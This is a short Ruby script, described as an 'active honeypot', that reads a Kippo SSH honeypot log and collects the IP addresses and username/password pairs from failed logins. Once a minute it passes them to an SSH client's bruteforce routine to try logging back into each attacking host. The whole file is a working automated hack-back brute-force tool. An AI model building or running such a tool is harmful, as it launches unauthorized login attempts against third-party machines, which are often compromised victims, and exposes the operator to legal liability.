#!/usr/bin/env ruby

klog_fname = ARGV[0]

unless ARGV[0] and File.readable?(klog_fname)
	puts "Usage: #{$0} /path/to/kippo.log"
	exit 1
end

$:.unshift File.expand_path("../lib")
require 'ssh_client'

class KippoLog

	attr_accessor :creds

	def initialize(fname)
		@fname = fname
		@fdata = Kernel.open(@fname)
		@offset = @fdata.size
		@fdata.seek @offset # Just start at the end
		@creds = {}
	end

	def parse
		@creds = {}
		@fdata.seek @offset
		lines = @fdata.read @fdata.size
		return @creds unless lines
		lines.each_line do |line|
			next unless line =~ /,([0-9.]+)\] login attempt \[(.*)\] failed/
			host = $1
			userpass = $2
			user,pass = userpass.split("/",2)
			fulluser = user + '@' + host
			@creds[fulluser] ||= []
			@creds[fulluser] << pass
		end
		@offset = @fdata.size
		return @creds
	end

end

require 'timeout'

class Responder

	def initialize(klog)
		raise ArgumentError unless klog.kind_of? KippoLog
		@klog = klog
		return self
	end

	def start
		puts "#{Time.now.utc} Active honeypot active!"
		loop do
			creds = @klog.parse
			if creds.keys.empty?
				puts "#{Time.now.utc} No recent logins."
			else
				puts "#{Time.now.utc} Got a bite!"
				creds.each_pair do |userhost,passes|
					user,host = userhost.split('@')
					connect_back(user,host,passes)
				end
			end
			$stdout.flush
			sleep 60
		end
	end

	def connect_back(user,host,passes)
		begin
			Timeout.timeout(10) do
				client = SshClient.new(
					:user => user,
					:host => host,
					:passlist => passes
				)
				client.bruteforce
			end
		rescue
			puts "Timed out, probably not listening."
		end
	end

end

hp = Responder.new(KippoLog.new(ARGV[0]))
hp.start

